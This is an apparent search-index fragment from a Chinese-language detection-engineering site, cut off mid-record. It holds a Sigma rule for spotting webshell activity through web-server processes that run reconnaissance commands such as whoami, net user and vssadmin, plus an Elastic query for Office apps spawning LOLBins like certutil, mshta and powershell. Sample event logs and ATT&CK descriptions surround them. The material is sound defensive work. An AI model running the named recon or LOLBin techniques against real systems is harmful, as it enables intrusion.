- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"> - <System> <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\" /> <EventID>4688</EventID> <Version>2</Version> <Level>0</Level> <Task>13312</Task> <Opcode>0</Opcode> <Keywords>0x8020000000000000</Keywords> <TimeCreated SystemTime=\"2015-11-12T02:24:52.377352500Z\" /> <EventRecordID>2814</EventRecordID> <Correlation /> <Execution ProcessID=\"4\" ThreadID=\"400\" /> <Channel>Security</Channel> <Computer>WIN-GG82ULGC9GO.contoso.local</Computer> <Security /> </System> - <EventData> <Data Name=\"SubjectUserSid\">S-1-5-18</Data> <Data Name=\"SubjectUserName\">WIN-GG82ULGC9GO$</Data> <Data Name=\"SubjectDomainName\">CONTOSO</Data> <Data Name=\"SubjectLogonId\">0x3e7</Data> <Data Name=\"NewProcessId\">0x2bc</Data> <Data Name=\"NewProcessName\">C:\\\\Windows\\\\System32\\\\rundll32.exe</Data> <Data Name=\"TokenElevationType\">%%1938</Data> <Data Name=\"ProcessId\">0xe74</Data> <Data Name=\"CommandLine\" /> <Data Name=\"TargetUserSid\">S-1-5-21-1377283216-344919071-3415362939-1104</Data> <Data Name=\"TargetUserName\">dadmin</Data> <Data Name=\"TargetDomainName\">CONTOSO</Data> <Data Name=\"TargetLogonId\">0x4a5af0</Data> <Data Name=\"ParentProcessName\">C:\\\\Windows\\\\explorer.exe</Data> <Data Name=\"MandatoryLabel\">S-1-16-8192</Data> </EventData> </Event> \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u901a\u8fc7\u5e38\u89c1\u7684\u547d\u4ee4\u884c\u53c2\u6570\u68c0\u6d4bwebshell\u884c\u4e3a description: \u901a\u8fc7web shell\u4fa6\u5bdf\u6d3b\u52a8\u4e2d\u7ecf\u5e38\u4f7f\u7528\u7684\u67d0\u4e9b\u547d\u4ee4\u884c\u53c2\u6570\u6765\u68c0\u6d4b\u8fb9\u754cweb\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728webshell references: - https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html - https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/ tags: - attack.persistence - attack.t1505.003 - attack.t1018 - attack.t1033 - attack.t1087 - attack.privilege_escalation # an old one - attack.t1100 # an old one logsource: category: process_creation #\u8fdb\u7a0b\u521b\u5efa product: windows #windows\u6570\u636e\u6e90 detection: selection: ParentImage: - '*\\apache*' - '*\\tomcat*' - '*\\w3wp.exe' - '*\\php-cgi.exe' - '*\\nginx.exe' - '*\\httpd.exe' CommandLine: - '*whoami*' - '*net user *' - '*net use *' - '*net group *' - '*quser*' - '*ping -n *' - '*systeminfo' - '*&cd&echo*' - '*cd /d*' # https://www.computerhope.com/cdhlp.htm - '*ipconfig*' - '*pathping*' - '*tracert*' - '*netstat*' - '*schtasks*' - '*vssadmin*' - '*wevtutil*' - '*tasklist*' - '*wmic /node:*' - '*Test-NetConnection*' - '*dir \\*' # remote dir: dir \\<redacted IP #3>\\C$:\\windows\\temp\\*.exe condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - unknown #\u6709\u6548\u6027\uff0c\u672a\u77e5 level: high #\u7b49\u7ea7\u8f83\u9ad8 \u5907\u6ce8 \u6574\u4f53\u68c0\u6d4b\u601d\u8def\uff0c\u653b\u51fb\u8005\u901a\u8fc7webshell\u6267\u884c\u4e00\u4e9b\u4fe1\u606f\u6536\u96c6\u7684\u547d\u4ee4\uff0c\u5982ipconfig\u7b49\u547d\u4ee4\u3002\u6b64\u7c7b\u884c\u4e3a\u5728windows\u65e5\u5fd7\u4e0a\u7684\u8868\u73b0\u5f62\u5f0f\u4e3a\uff0c\u7528\u6237\u8c03\u7528\u4e86\u5e38\u89c1\u7684\u4e2d\u95f4\u4ef6\u7684\u8fdb\u7a0b\uff0c\u6267\u884c\u4e86\u67d0\u4e9b\u547d\u4ee4\u3002\u6b64\u89c4\u5219\u68c0\u6d4b\u601d\u8def\u4fbf\u662f\u6765\u6e90\u4e8e\u6b64\uff0c\u4ec5\u4ec5\u9002\u7528\u4e8ewindows\u5e73\u53f0\uff0c\u53ef\u81ea\u884c\u6dfb\u52a0\u5e38\u89c1\u7684\u7528\u4e8e\u4fe1\u606f\u6536\u96c6\u6216\u8005\u5176\u4ed6\u76ee\u7684\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4e0d\u65ad\u5b8c\u5584\u89c4\u5219\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1505-003 https://attack.mitre.org/techniques/T1505/003/","title":"T1505-003-windows\u4e0bwebshell\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#t1505-003-windowswebshell","text":"","title":"T1505-003-windows\u4e0bwebshell\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5e26\u6709Web Shell\u7684\u540e\u95e8Web\u670d\u52a1\u5668\u7528\u4e8e\u5efa\u7acb\u5bf9\u7cfb\u7edf\u7684\u6301\u4e45\u8bbf\u95ee\u3002Web Shell\u662f\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\u7684Web\u811a\u672c\uff0c\u4ee5\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u8fdb\u5165\u7f51\u7edc\u7684\u7f51\u5173\u3002Web shell\u7a0b\u5e8f\u53ef\u4ee5\u5728\u6258\u7ba1Web\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u4e0a\u63d0\u4f9b\u4e00\u7ec4\u8981\u6267\u884c\u7684\u529f\u80fd\u6216\u4e00\u4e2a\u547d\u4ee4\u884c\u754c\u9762\u3002 \u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWeb Shell\u53ef\u80fd\u8fd8\u5177\u6709\u7528\u4e8e\u4e0eWeb\u670d\u52a1\u5668\u5bf9\u8bdd\u7684\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f(\u5982\u83dc\u5200\u3001\u51b0\u874e\u3001\u54e5\u65af\u62c9\u7b49)","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#regeorg","text":"webshell\u5c31\u662f\u4ee5asp\u3001php\u3001jsp\u6216\u8005cgi\u7b49\u7f51\u9875\u6587\u4ef6\u5f62\u5f0f\u5b58\u5728\u7684\u4e00\u79cd\u4ee3\u7801\u6267\u884c\u73af\u5883\uff0c\u4e5f\u53ef\u4ee5\u5c06\u5176\u79f0\u505a\u4e3a\u4e00\u79cd\u7f51\u9875\u540e\u95e8\u3002\u9ed1\u5ba2\u5728\u5165\u4fb5\u4e86\u4e00\u4e2a\u7f51\u7ad9\u540e\uff0c\u901a\u5e38\u4f1a\u5c06asp\u6216php\u540e\u95e8\u6587\u4ef6\u4e0e\u7f51\u7ad9\u670d\u52a1\u5668WEB\u76ee\u5f55\u4e0b\u6b63\u5e38\u7684\u7f51\u9875\u6587\u4ef6\u6df7\u5728\u4e00\u8d77\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528\u6d4f\u89c8\u5668\u6765\u8bbf\u95eeasp\u6216\u8005php\u540e\u95e8\uff0c\u5f97\u5230\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u73af\u5883\uff0c\u4ee5\u8fbe\u5230\u63a7\u5236\u7f51\u7ad9\u670d\u52a1\u5668\u7684\u76ee\u7684\u3002 \u987e\u540d\u601d\u4e49\uff0c\u201cweb\u201d\u7684\u542b\u4e49\u662f\u663e\u7136\u9700\u8981\u670d\u52a1\u5668\u5f00\u653eweb\u670d\u52a1\uff0c\u201cshell\u201d\u7684\u542b\u4e49\u662f\u53d6\u5f97\u5bf9\u670d\u52a1\u5668\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u64cd\u4f5c\u6743\u9650\u3002webshell\u5e38\u5e38\u88ab\u79f0\u4e3a\u5165\u4fb5\u8005\u901a\u8fc7\u7f51\u7ad9\u7aef\u53e3\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u7684\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u64cd\u4f5c\u7684\u6743\u9650\u3002\u7531\u4e8ewebshell\u5176\u5927\u591a\u662f\u4ee5\u52a8\u6001\u811a\u672c\u7684\u5f62\u5f0f\u51fa\u73b0\uff0c\u4e5f\u6709\u4eba\u79f0\u4e4b\u4e3a\u7f51\u7ad9\u7684\u540e\u95e8\u5de5\u5177\u3002","title":"ReGeorg\u7b80\u4ecb"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_2","text":"windows\u3001sysmon\u65e5\u5fd7\u3001\u4ee5\u53ca\u5176\u4ed6\u53ef\u8bb0\u5f55\u8fdb\u7a0b\u3001\u547d\u4ee4\u884c\u53c2\u6570\u7684EDR\u4ea7\u54c1","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_4","text":"- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"> - <System> <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\" /> <EventID>4688</EventID> <Version>2</Version> <Level>0</Level> <Task>13312</Task> <Opcode>0</Opcode> <Keywords>0x8020000000000000</Keywords> <TimeCreated SystemTime=\"2015-11-12T02:24:52.377352500Z\" /> <EventRecordID>2814</EventRecordID> <Correlation /> <Execution ProcessID=\"4\" ThreadID=\"400\" /> <Channel>Security</Channel> <Computer>WIN-GG82ULGC9GO.contoso.local</Computer> <Security /> </System> - <EventData> <Data Name=\"SubjectUserSid\">S-1-5-18</Data> <Data Name=\"SubjectUserName\">WIN-GG82ULGC9GO$</Data> <Data Name=\"SubjectDomainName\">CONTOSO</Data> <Data Name=\"SubjectLogonId\">0x3e7</Data> <Data Name=\"NewProcessId\">0x2bc</Data> <Data Name=\"NewProcessName\">C:\\\\Windows\\\\System32\\\\rundll32.exe</Data> <Data Name=\"TokenElevationType\">%%1938</Data> <Data Name=\"ProcessId\">0xe74</Data> <Data Name=\"CommandLine\" /> <Data Name=\"TargetUserSid\">S-1-5-21-1377283216-344919071-3415362939-1104</Data> <Data Name=\"TargetUserName\">dadmin</Data> <Data Name=\"TargetDomainName\">CONTOSO</Data> <Data Name=\"TargetLogonId\">0x4a5af0</Data> <Data Name=\"ParentProcessName\">C:\\\\Windows\\\\explorer.exe</Data> <Data Name=\"MandatoryLabel\">S-1-16-8192</Data> </EventData> </Event>","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#sigma","text":"title: \u901a\u8fc7\u5e38\u89c1\u7684\u547d\u4ee4\u884c\u53c2\u6570\u68c0\u6d4bwebshell\u884c\u4e3a description: \u901a\u8fc7web shell\u4fa6\u5bdf\u6d3b\u52a8\u4e2d\u7ecf\u5e38\u4f7f\u7528\u7684\u67d0\u4e9b\u547d\u4ee4\u884c\u53c2\u6570\u6765\u68c0\u6d4b\u8fb9\u754cweb\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728webshell references: - https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html - https://unit42.paloaltonetworks.com/bumblebee-webshell-xhunt-campaign/ tags: - attack.persistence - attack.t1505.003 - attack.t1018 - attack.t1033 - attack.t1087 - attack.privilege_escalation # an old one - attack.t1100 # an old one logsource: category: process_creation #\u8fdb\u7a0b\u521b\u5efa product: windows #windows\u6570\u636e\u6e90 detection: selection: ParentImage: - '*\\apache*' - '*\\tomcat*' - '*\\w3wp.exe' - '*\\php-cgi.exe' - '*\\nginx.exe' - '*\\httpd.exe' CommandLine: - '*whoami*' - '*net user *' - '*net use *' - '*net group *' - '*quser*' - '*ping -n *' - '*systeminfo' - '*&cd&echo*' - '*cd /d*' # https://www.computerhope.com/cdhlp.htm - '*ipconfig*' - '*pathping*' - '*tracert*' - '*netstat*' - '*schtasks*' - '*vssadmin*' - '*wevtutil*' - '*tasklist*' - '*wmic /node:*' - '*Test-NetConnection*' - '*dir \\*' # remote dir: dir \\<redacted IP #3>\\C$:\\windows\\temp\\*.exe condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - unknown #\u6709\u6548\u6027\uff0c\u672a\u77e5 level: high #\u7b49\u7ea7\u8f83\u9ad8","title":"sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_6","text":"\u6574\u4f53\u68c0\u6d4b\u601d\u8def\uff0c\u653b\u51fb\u8005\u901a\u8fc7webshell\u6267\u884c\u4e00\u4e9b\u4fe1\u606f\u6536\u96c6\u7684\u547d\u4ee4\uff0c\u5982ipconfig\u7b49\u547d\u4ee4\u3002\u6b64\u7c7b\u884c\u4e3a\u5728windows\u65e5\u5fd7\u4e0a\u7684\u8868\u73b0\u5f62\u5f0f\u4e3a\uff0c\u7528\u6237\u8c03\u7528\u4e86\u5e38\u89c1\u7684\u4e2d\u95f4\u4ef6\u7684\u8fdb\u7a0b\uff0c\u6267\u884c\u4e86\u67d0\u4e9b\u547d\u4ee4\u3002\u6b64\u89c4\u5219\u68c0\u6d4b\u601d\u8def\u4fbf\u662f\u6765\u6e90\u4e8e\u6b64\uff0c\u4ec5\u4ec5\u9002\u7528\u4e8ewindows\u5e73\u53f0\uff0c\u53ef\u81ea\u884c\u6dfb\u52a0\u5e38\u89c1\u7684\u7528\u4e8e\u4fe1\u606f\u6536\u96c6\u6216\u8005\u5176\u4ed6\u76ee\u7684\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4e0d\u65ad\u5b8c\u5584\u89c4\u5219\u3002","title":"\u5907\u6ce8"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/#_7","text":"MITRE-ATT&CK-T1505-003 https://attack.mitre.org/techniques/T1505/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/","text":"T1566-001-win-\u53ef\u7591\u7684MS Office\u5b50\u8fdb\u7a0b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u53d1\u9001\u5e26\u6709\u6076\u610f\u9644\u4ef6\u7684\u9c7c\u53c9\u5f0f\u7535\u5b50\u90ae\u4ef6\uff0c\u4ee5\u8bd5\u56fe\u8bbf\u95ee\u53d7\u5bb3\u8005\u7cfb\u7edf\u3002\u9c7c\u53c9\u5f0f\u9644\u4ef6\u4e0e\u5176\u4ed6\u5f62\u5f0f\u7684\u9c7c\u53c9\u5f0f\u9644\u4ef6\u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c\u5b83\u4f7f\u7528\u4e86\u9644\u52a0\u5230\u7535\u5b50\u90ae\u4ef6\u7684\u6076\u610f\u8f6f\u4ef6\u3002\u6240\u6709\u5f62\u5f0f\u7684\u9c7c\u53c9\u5f0f\u5e7f\u544a\u90fd\u662f\u4ee5\u7535\u5b50\u65b9\u5f0f\u4ea4\u4ed8\u7684\u9488\u5bf9\u7279\u5b9a\u4e2a\u4eba\uff0c\u516c\u53f8\u6216\u884c\u4e1a\u7684\u793e\u4f1a\u5de5\u7a0b\u5b66\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u4f1a\u5c06\u6587\u4ef6\u9644\u52a0\u5230\u6b3a\u9a97\u6027\u7535\u5b50\u90ae\u4ef6\u4e2d\uff0c\u5e76\u4e14\u901a\u5e38\u4f9d\u9760\u7528\u6237\u6267\u884c\u6765\u83b7\u5f97\u6267\u884c\u3002 \u9644\u4ef6\u6709\u5f88\u591a\u9009\u9879\uff0c\u4f8b\u5982Microsoft Office\u6587\u6863\uff0c\u53ef\u6267\u884c\u6587\u4ef6\uff0cPDF\u6216\u5b58\u6863\u6587\u4ef6\u3002\u6253\u5f00\u9644\u4ef6\uff08\u5e76\u53ef\u80fd\u5355\u51fb\u8fc7\u53bb\u7684\u4fdd\u62a4\uff09\u540e\uff0c\u653b\u51fb\u8005\u7684\u6709\u6548\u8d1f\u8f7d\u4f1a\u5229\u7528\u6f0f\u6d1e\u6216\u76f4\u63a5\u5728\u7528\u6237\u7684\u7cfb\u7edf\u4e0a\u6267\u884c\u3002\u9c7c\u53c9\u5f0f\u7535\u5b50\u90ae\u4ef6\u7684\u6587\u672c\u901a\u5e38\u8bd5\u56fe\u7ed9\u51fa\u4e00\u4e2a\u5408\u7406\u7684\u539f\u56e0\u6765\u89e3\u91ca\u4e3a\u4ec0\u4e48\u5e94\u8be5\u6253\u5f00\u8be5\u6587\u4ef6\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u89e3\u91ca\u5982\u4f55\u7ed5\u5f00\u7cfb\u7edf\u4fdd\u62a4\u63aa\u65bd\u3002\u8be5\u7535\u5b50\u90ae\u4ef6\u8fd8\u53ef\u80fd\u5305\u542b\u6709\u5173\u5982\u4f55\u89e3\u5bc6\u9644\u4ef6\uff08\u4f8b\u5982zip\u6587\u4ef6\u5bc6\u7801\uff09\u7684\u8bf4\u660e\uff0c\u4ee5\u9003\u907f\u7535\u5b50\u90ae\u4ef6\u8fb9\u754c\u9632\u5fa1\u3002\u653b\u51fb\u8005\u7ecf\u5e38\u64cd\u7eb5\u6587\u4ef6\u6269\u5c55\u540d\u548c\u56fe\u6807\uff0c\u4ee5\u4f7f\u9644\u52a0\u7684\u53ef\u6267\u884c\u6587\u4ef6\u770b\u8d77\u6765\u50cf\u6587\u6863\u6587\u4ef6\uff0c\u6216\u8005\u5229\u7528\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7684\u6587\u4ef6\u770b\u8d77\u6765\u50cf\u662f\u53e6\u4e00\u6587\u4ef6\u7684\u6587\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 windows\u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0\u6d4b\u8bd5\u6848\u4f8b \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff0c\u53ef\u53c2\u770bwindows 4688\u8fdb\u7a0b\u521b\u5efa\u65e5\u5fd7\u6837\u4f8b\uff0c\u8f85\u52a9\u7406\u89e3\u3002 Pre-Windows 2016/10 A new process has been created. Subject: Security ID: WIN-R9H529RIO4Y\\Administrator Account Name: Administrator Account Domain: WIN-R9H529RIO4Y Logon ID: 0x1fd23 Process Information: New Process ID: 0xed0 New Process Name: C:\\Windows\\System32\\notepad.exe Token Elevation Type: TokenElevationTypeDefault (1) Mandatory Label: Mandatory Label\\Medium Mandatory Level Creator Process ID: 0x8c0 Creator Process Name: c:\\windows\\system32\\explorer.exe Process Command Line: C:\\Windows\\System32\\notepad.exe c:\\sys\\junk.txt \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Elastic rule query event.action:\"Process Create (rule: ProcessCreate)\" and process.parent.name:(eqnedt32.exe or excel.exe or fltldr.exe or msaccess.exe or mspub.exe or powerpnt.exe or winword.exe) and process.name:(Microsoft.Workflow.Compiler.exe or arp.exe or atbroker.exe or bginfo.exe or bitsadmin.exe or cdb.exe or certutil.exe or cmd.exe or cmstp.exe or cscript.exe or csi.exe or dnx.exe or dsget.exe or dsquery.exe or forfiles.exe or fsi.exe or ftp.exe or gpresult.exe or hostname.exe or ieexec.exe or iexpress.exe or installutil.exe or ipconfig.exe or mshta.exe or msxsl.exe or nbtstat.exe or net.exe or net1.exe or netsh.exe or netstat.exe or nltest.exe or odbcconf.exe or ping.exe or powershell.exe or pwsh.exe or qprocess.exe or quser.exe or qwinsta.exe or rcsi.exe or reg.exe or regasm.exe or regsvcs.exe or regsvr32.exe or sc.exe or schtasks.exe or systeminfo.exe or tasklist.exe or tracert.exe or whoami.exe or wmic.exe or wscript.exe or xwizard.exe) \u5efa\u8bae \u53ef\u81ea\u884c\u8f6c\u6362\u4e3asigma\u683c\u5f0f\uff0c\u6765\u5b9e\u73b0\u5bf9\u591a\u4e2a\u5e73\u53f0\u7684\u652f\u6301\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1566-001 https://attack.mitre.org/techniques/T10566/001/ \u68c0\u6d4b\u53ef\u7591\u7684MS Office\u5b50\u8fdb\u7a0b https://www.elastic.co/guide/en/siem/guide/current/suspicious-ms-office-child-process.html","title":"T1566-001-win-\u53ef\u7591\u7684MS Office\u5b50\u8fdb\u7a0b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#t1566-001-win-ms-office","text":"","title":"T1566-001-win-\u53ef\u7591\u7684MS Office\u5b50\u8fdb\u7a0b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u53d1\u9001\u5e26\u6709\u6076\u610f\u9644\u4ef6\u7684\u9c7c\u53c9\u5f0f\u7535\u5b50\u90ae\u4ef6\uff0c\u4ee5\u8bd5\u56fe\u8bbf\u95ee\u53d7\u5bb3\u8005\u7cfb\u7edf\u3002\u9c7c\u53c9\u5f0f\u9644\u4ef6\u4e0e\u5176\u4ed6\u5f62\u5f0f\u7684\u9c7c\u53c9\u5f0f\u9644\u4ef6\u7684\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c\u5b83\u4f7f\u7528\u4e86\u9644\u52a0\u5230\u7535\u5b50\u90ae\u4ef6\u7684\u6076\u610f\u8f6f\u4ef6\u3002\u6240\u6709\u5f62\u5f0f\u7684\u9c7c\u53c9\u5f0f\u5e7f\u544a\u90fd\u662f\u4ee5\u7535\u5b50\u65b9\u5f0f\u4ea4\u4ed8\u7684\u9488\u5bf9\u7279\u5b9a\u4e2a\u4eba\uff0c\u516c\u53f8\u6216\u884c\u4e1a\u7684\u793e\u4f1a\u5de5\u7a0b\u5b66\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u4f1a\u5c06\u6587\u4ef6\u9644\u52a0\u5230\u6b3a\u9a97\u6027\u7535\u5b50\u90ae\u4ef6\u4e2d\uff0c\u5e76\u4e14\u901a\u5e38\u4f9d\u9760\u7528\u6237\u6267\u884c\u6765\u83b7\u5f97\u6267\u884c\u3002 \u9644\u4ef6\u6709\u5f88\u591a\u9009\u9879\uff0c\u4f8b\u5982Microsoft Office\u6587\u6863\uff0c\u53ef\u6267\u884c\u6587\u4ef6\uff0cPDF\u6216\u5b58\u6863\u6587\u4ef6\u3002\u6253\u5f00\u9644\u4ef6\uff08\u5e76\u53ef\u80fd\u5355\u51fb\u8fc7\u53bb\u7684\u4fdd\u62a4\uff09\u540e\uff0c\u653b\u51fb\u8005\u7684\u6709\u6548\u8d1f\u8f7d\u4f1a\u5229\u7528\u6f0f\u6d1e\u6216\u76f4\u63a5\u5728\u7528\u6237\u7684\u7cfb\u7edf\u4e0a\u6267\u884c\u3002\u9c7c\u53c9\u5f0f\u7535\u5b50\u90ae\u4ef6\u7684\u6587\u672c\u901a\u5e38\u8bd5\u56fe\u7ed9\u51fa\u4e00\u4e2a\u5408\u7406\u7684\u539f\u56e0\u6765\u89e3\u91ca\u4e3a\u4ec0\u4e48\u5e94\u8be5\u6253\u5f00\u8be5\u6587\u4ef6\uff0c\u5e76\u4e14\u53ef\u80fd\u4f1a\u89e3\u91ca\u5982\u4f55\u7ed5\u5f00\u7cfb\u7edf\u4fdd\u62a4\u63aa\u65bd\u3002\u8be5\u7535\u5b50\u90ae\u4ef6\u8fd8\u53ef\u80fd\u5305\u542b\u6709\u5173\u5982\u4f55\u89e3\u5bc6\u9644\u4ef6\uff08\u4f8b\u5982zip\u6587\u4ef6\u5bc6\u7801\uff09\u7684\u8bf4\u660e\uff0c\u4ee5\u9003\u907f\u7535\u5b50\u90ae\u4ef6\u8fb9\u754c\u9632\u5fa1\u3002\u653b\u51fb\u8005\u7ecf\u5e38\u64cd\u7eb5\u6587\u4ef6\u6269\u5c55\u540d\u548c\u56fe\u6807\uff0c\u4ee5\u4f7f\u9644\u52a0\u7684\u53ef\u6267\u884c\u6587\u4ef6\u770b\u8d77\u6765\u50cf\u6587\u6863\u6587\u4ef6\uff0c\u6216\u8005\u5229\u7528\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7684\u6587\u4ef6\u770b\u8d77\u6765\u50cf\u662f\u53e6\u4e00\u6587\u4ef6\u7684\u6587\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7/sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_3","text":"\u6682\u65e0\u6d4b\u8bd5\u6848\u4f8b","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_4","text":"\u6682\u65e0\uff0c\u53ef\u53c2\u770bwindows 4688\u8fdb\u7a0b\u521b\u5efa\u65e5\u5fd7\u6837\u4f8b\uff0c\u8f85\u52a9\u7406\u89e3\u3002 Pre-Windows 2016/10 A new process has been created. Subject: Security ID: WIN-R9H529RIO4Y\\Administrator Account Name: Administrator Account Domain: WIN-R9H529RIO4Y Logon ID: 0x1fd23 Process Information: New Process ID: 0xed0 New Process Name: C:\\Windows\\System32\\notepad.exe Token Elevation Type: TokenElevationTypeDefault (1) Mandatory Label: Mandatory Label\\Medium Mandatory Level Creator Process ID: 0x8c0 Creator Process Name: c:\\windows\\system32\\explorer.exe Process Command Line: C:\\Windows\\System32\\notepad.exe c:\\sys\\junk.txt","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#elastic-rule-query","text":"event.action:\"Process Create (rule: ProcessCreate)\" and process.parent.name:(eqnedt32.exe or excel.exe or fltldr.exe or msaccess.exe or mspub.exe or powerpnt.exe or winword.exe) and 